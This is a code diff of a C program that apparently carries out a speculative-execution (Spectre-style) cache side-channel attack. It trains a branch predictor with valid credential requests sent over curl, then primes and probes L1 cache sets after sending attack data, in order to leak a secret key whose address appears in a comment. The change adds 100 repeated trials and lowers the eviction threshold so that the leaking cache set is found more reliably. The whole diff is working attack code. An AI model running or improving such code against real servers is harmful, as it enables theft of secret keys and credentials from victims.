@@ -18,7 +18,7 @@
 #define TRAINING_REPS 100
 #define ATTACK_RUNS 100.0
 
-#define EVICTION_THRESHOLD 10
+#define EVICTION_THRESHOLD 5
 // ADDRESS SECRET_KEY[0] -> 0x555555556008
 
 unsigned int probe_array[PROBE_ARR_SIZE]; // allocates int array of size = L1_SIZE
@@ -46,46 +46,62 @@ int main(int argc, char* argv[]) {
         curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, write_junk);
     }
 
+    int top_sets[SETS+1] = {0};
+    for (int j = 0; j < 100; j++) {
 
-    int count[SETS] = {0}; // records sets that have been touched
-    int baseline[SETS] = {0};    
-    
-    int loops = ATTACK_RUNS;
-    while (loops > 0){
-        // Train BP
-        for(int i = 0; i < TRAINING_REPS; i++){
-                prime_cache(); // prime L1 with probe array
+        int count[SETS] = {0}; // records sets that have been touched
+        int baseline[SETS] = {0};    
 
-                make_request(valid_data); // send valid credentials
+        int loops = ATTACK_RUNS;
+        while (loops > 0){
+            // Train BP
+            for(int i = 0; i < TRAINING_REPS; i++){
+                    prime_cache(); // prime L1 with probe array
 
-                // adds to count to calculate baseline
-                check_cache_presence(baseline);
+                    make_request(valid_data); // send valid credentials
+
+                    // adds to count to calculate baseline
+                    check_cache_presence(baseline);
+                }
+            
+            
+            prime_cache(); // prime L1 with probe array
+
+            _mm_mfence(); // wait for prime to compelte before sending bad request
+            // cache check 
+            make_request(attack_data);
+            _mm_mfence();
+
+            check_cache_presence(count);
+            loops --;
+        }
+        float highest_diff = 0;
+        int set = SETS;
+        printf("\n===== Eviction Difs =====\n");
+        for (int i = 0; i < SETS; i++) {
+            // get avg misses for each attack run
+            float avg_baseline = baseline[i] / ATTACK_RUNS;
+        
+            float diff = (float)count[i] - avg_baseline;
+
+            // if attack increased eviction more than threshold
+            if (diff > EVICTION_THRESHOLD) { 
+                printf("Set %d: +%.2f\n", i, diff); // print diff
+                if (diff > highest_diff){
+                    set = i;
+                    highest_diff = diff;
+                }
             }
-        
-        
-        prime_cache(); // prime L1 with probe array
-
-        _mm_mfence(); // wait for prime to compelte before sending bad request
-        // cache check 
-        make_request(attack_data);
-        _mm_mfence();
-
-        check_cache_presence(count);
-        loops --;
+        }
+        top_sets[set] ++;
+    }
+    printf("\n ==== TOP SETS ==== \n");
+    for (int i = 0; i < SETS; i++) {
+        if (top_sets[i] > 0){
+            printf("Set %d: %d\n", i, top_sets[i]);
+        }
     }
 
-    printf("\n===== Eviction Difs =====\n");
-    for (int i = 0; i < SETS; i++) {
-        // get avg misses for each attack run
-        float avg_baseline = baseline[i] / ATTACK_RUNS;
-    
-        float diff = (float)count[i] - avg_baseline;
-
-        // if attack increased eviction more than threshold
-        if (diff > EVICTION_THRESHOLD) { 
-            printf("Set %d: +%.2f\n", i, diff); // print diff
-        }
-}
     curl_easy_cleanup(curl_handle);
     return 0;
 }
